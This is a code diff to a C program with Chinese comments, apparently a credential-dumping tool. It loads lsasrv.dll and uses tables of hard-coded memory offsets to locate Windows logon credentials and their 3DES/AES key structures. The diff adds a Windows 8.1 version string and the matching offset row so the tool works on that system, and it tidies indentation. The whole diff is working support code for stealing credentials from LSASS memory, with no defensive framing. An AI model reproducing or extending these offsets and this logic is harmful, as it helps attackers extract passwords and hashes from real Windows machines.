@@ -55,7 +55,8 @@ char version_table[TABLE_LENGTH][50] = {
 	"10.0.14393.0",
 	"10.0.17763.1",
 	"6.1.7601.24214",
-	"6.1.7600.16385"
+	"6.1.7600.16385",
+	"6.3.9600.16384"
 };
 DWORD offset_table[TABLE_LENGTH] = {
 	0x32BC3,
@@ -63,6 +64,7 @@ DWORD offset_table[TABLE_LENGTH] = {
 };
 
 DWORD _offset_table[TABLE_LENGTH][5] = {
+	// 目前来看，最后一个偏移量，只有win7系列的是0x18
 	  {0x32BC3,0x39E5C,0x9E36E,0x108,0x38},
 	  {0x1FA63,0x395DC,0x8CA6C,0x108,0x38},
 	  {0x16150,0x111DE,0x3261B,0xE8,0x18},
@@ -70,7 +72,8 @@ DWORD _offset_table[TABLE_LENGTH][5] = {
 	  {0x285FF,0x3992C,0x399EC,0x108,0x38},
 	  {0x1E162,0x1944C,0x1950C,0x108,0x38},
 	  {0x1C448,0x193EE,0x39B2A,0xE8,0x18},
-	  {0x16030,0x110FE,0x32B0B,0xE8,0x18}
+	  {0x16030,0x110FE,0x32B0B,0xE8,0x18},
+	  {0x4482B,0x4DBA8,0xB0A90,0xE8,0x38}
 };
 void getosversion(char* result) {
 	char buffer[1024] = { 0 };
@@ -240,7 +243,7 @@ int main(int argc, char** argv)
 		offset____ = 0x108;
 	}
 	// 我们把lsasrv.dll自己加载上来看一下ntheader就行了
- unsigned char* lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
+	unsigned char* lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
 	if (lsasrvLocal == (unsigned char*)0) {
 		printf("[x] load module failed, abort...\n");
 		return 1;
@@ -279,9 +282,9 @@ int main(int argc, char** argv)
 			// credential offset
 		//	sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", _offset_table[i][3]);
 			// 这个偏移需要进行很多的判断，不能直接硬编码
-		sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", offset____);
-		// 
-			// _3des_aes_len_offset   windows10系列和windows7系列有点不一样
+			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", offset____);
+			// 
+				// _3des_aes_len_offset   windows10系列和windows7系列有点不一样
 			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8, 123, "%02x", _offset_table[i][4]);
 
 			// 把版本号也写进去
